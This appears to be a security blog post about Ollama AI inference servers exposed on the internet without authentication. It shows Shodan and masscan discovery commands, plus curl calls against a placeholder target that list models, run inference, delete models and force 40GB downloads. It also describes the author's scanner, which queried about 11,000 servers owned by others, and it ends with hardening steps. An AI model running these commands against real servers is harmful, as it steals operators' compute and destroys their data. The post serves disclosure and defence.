---
title: "10 thousand AI servers are open to the Internet"
date: 2026-04-21
description: "A technical breakdown of how attackers discover, validate, and exploit publicly exposed Ollama inference servers, covering Shodan queries, masscan, the unauthenticated REST API, compute theft, and how to lock your server down."
keywords:
  - ollama
  - exposed ai
  - shodan
  - masscan
  - unauthenticated api
  - llm security
  - inference server
  - resource theft
  - red team
  - self-hosted ai
---

Tens of thousands of Ollama inference servers are publicly reachable on the internet with no authentication, no access control, and no logging for the operator. This post goes through the full attack chain: how to find these servers, what the API exposes, what the impact looks like at scale, and how to lock things down.

---

## Finding exposed servers

There are two ways to find exposed Ollama instances.

### Shodan

A simple Shodan query returns thousands of results:

```
port:11434 product:"Ollama"
```

### masscan

For active discovery, masscan can sweep the entire IPv4 address space on port `11434` in under an hour at aggressive rates. Port `11434` has become a known indicator of Ollama since the project gained popularity, making it an explicit target for anyone running a scan.

```bash
$ sudo masscan 0.0.0.0/0 -p 11434 --rate=100000 -oJ results.json
```

The output is a JSON file of every IP that responded.

---

## Validating the target

Having an open port doesn't confirm Ollama. Two steps to validate.

### TCP check

A simple TCP connection attempt tells you whether the service is live right now. IPs from Shodan might have closed the port since the last crawl. Use `nc`, `curl`, or any tool that attempts a connection. If it succeeds, the service is up.

### GET /api/tags

This is the critical endpoint. It returns every AI model installed on the server: names, sizes, parameter counts, and modification timestamps. No credentials. No headers. No token.

```bash
$ curl http://TARGET_IP:11434/api/tags
```

```json
{
  "models": [
    {
      "name": "llama3.2:latest",
      "model": "llama3.2:latest",
      "modified_at": "2026-03-14T22:11:02.123456789Z",
      "size": 2019393189,
      "digest": "a80c4f17acd5",
      "details": {
        "parent_model": "",
        "format": "gguf",
        "family": "llama",
        "families": ["llama"],
        "parameter_size": "3.2B",
        "quantization_level": "Q4_K_M"
      }
    },
    {
      "name": "deepseek-r1:7b",
      ...
    }
  ]
}
```

A 200 response with a populated model list means the target is running Ollama with loaded models, fully accessible. This single request:

- Confirms the target is genuinely running Ollama
- Reveals exactly which models are loaded
- Exposes the operator's AI workload and toolchain without any further interaction

---

## The API surface

Ollama's REST API has no authentication layer in its default configuration. Every endpoint is accessible to any client that can reach the port.

### POST /api/chat

The inference endpoint. Accepts a model name and a message, returns the model's response. This is the same endpoint legitimate users call.

```bash
$ curl http://TARGET_IP:11434/api/chat \
  -d '{
    "model": "llama3.2",
    "messages": [{ "role": "user", "content": "hello" }],
    "stream": false
  }'
```

```json
{
  "model": "llama3.2",
  "created_at": "2026-04-21T10:00:00Z",
  "message": {
    "role": "assistant",
    "content": "Hello! How can I help you today?"
  },
  "done": true,
  "total_duration": 1234567890,
  "load_duration": 5678,
  "prompt_eval_count": 10,
  "prompt_eval_duration": 123456,
  "eval_count": 12,
  "eval_duration": 987654321
}
```

Notice the response metadata: `total_duration`, `load_duration`, `prompt_eval_duration`, `eval_duration`, all in nanoseconds. Ollama returns detailed internal performance telemetry in every response. This gives an attacker a precise profile of the server's GPU or CPU performance without any further probing.

### POST /api/generate

Legacy completion endpoint. Same behavior, no auth.

```bash
$ curl http://TARGET_IP:11434/api/generate \
  -d '{"model": "llama3.2", "prompt": "hello", "stream": false}'
```

### DELETE /api/delete

Deletes a model from the server. Unauthenticated.

```bash
$ curl -X DELETE http://TARGET_IP:11434/api/delete \
  -d '{"name": "llama3.2:latest"}'
```

### POST /api/pull

Triggers a model download from the Ollama registry. Consumes bandwidth and disk space on the target server. Unauthenticated.

```bash
$ curl http://TARGET_IP:11434/api/pull \
  -d '{"name": "llama3.3:70b"}'
```

An attacker can trigger the download of a 40GB model on someone else's server. The victim pays for bandwidth and storage.

---

## Impact

### Compute theft

Inference is not a free operation. Every `/api/chat` call consumes GPU compute, VRAM, and electricity. When an attacker sends requests to an exposed server, the operator pays the cost.

At scale, a single probe of all exposed servers generated roughly **73 GPU-hours** of unauthorized compute and consumed **2.7 million tokens**, extracted from around 11,000 servers and billed to their owners. An attacker running continuous inference across these servers effectively operates a free GPU cluster at third-party expense.

### Model and workload intelligence

The metadata exposed by `/api/tags` has intelligence value on its own. Knowing which organizations are running which models reveals AI adoption, capability investment, and toolchain choices that would otherwise be confidential.

### Reputational and legal exposure

If an exposed server is used to generate harmful or illegal content, the generating IP belongs to the unknowing operator. The originating infrastructure is their machine, their cloud account, their identity.

### No visibility for the operator

There is no native mechanism in Ollama to alert the operator when an external actor queries their server. The request is processed, the response is returned, and nothing flags it as unusual. Unless the operator has deployed a reverse proxy with external logging or network flow analysis, they have zero awareness of unauthorized use.

---

## Securing your server

### Bind correctly

If you need Ollama reachable only on the local machine, make sure it's bound to `127.0.0.1`. If you need it reachable from other internal services, bind to a private interface or put it behind a VPN. Never leave port `11434` reachable from the public internet without a firewall rule in front of it.

```bash
OLLAMA_HOST=127.0.0.1 ollama serve
```

### Firewall rules

Restrict port `11434` at the security group or host firewall level to known IPs only:

```bash
$ iptables -A INPUT -p tcp --dport 11434 -s YOUR_IP -j ACCEPT
$ iptables -A INPUT -p tcp --dport 11434 -j DROP
```

On cloud providers, configure this at the VPC/security group level as well.

### Reverse proxy with authentication

Put Ollama behind nginx or Caddy with basic auth or an API key check. Caddy example:

```
:443 {
    basicauth {
        your_user JDJhJDE0JGRa...  # bcrypt hash
    }
    reverse_proxy localhost:11434
}
```

nginx with API key validation:

```nginx
server {
    listen 443 ssl;

    location / {
        if ($http_authorization != "Bearer YOUR_SECRET_TOKEN") {
            return 401;
        }
        proxy_pass http://127.0.0.1:11434;
    }
}
```

### Check your own exposure

```bash
$ curl http://YOUR_PUBLIC_IP:11434/api/tags
```

If that responds from outside your network, so does it for everyone else on the internet.

---

## olleak

To understand the real scale of this problem I built [olleak](https://github.com/dbx0/olleak), a scanner that automates the full chain described in this post.

It pulls IPs from Shodan via the cursor API, optionally runs masscan for active discovery, then fans out across all collected IPs using a thread pool. For each one it TCP-checks the port, hits `/api/tags`, and sends a chat message to every model it finds. Results land in a Postgres or SQLite database with full timing, token counts, and response language detection.

A single run against the 19,500 IPs Shodan had indexed at the time found:

- **10,898 responsive servers** (55.9%)
- **62,993 models exposed** across them
- **32,781 models** that answered a chat message

The numbers speak for themselves.

---

The self-hosted AI attack surface is growing faster than the security practices around it. Most operators don't realize they're exposed.

Have a nice day! :)
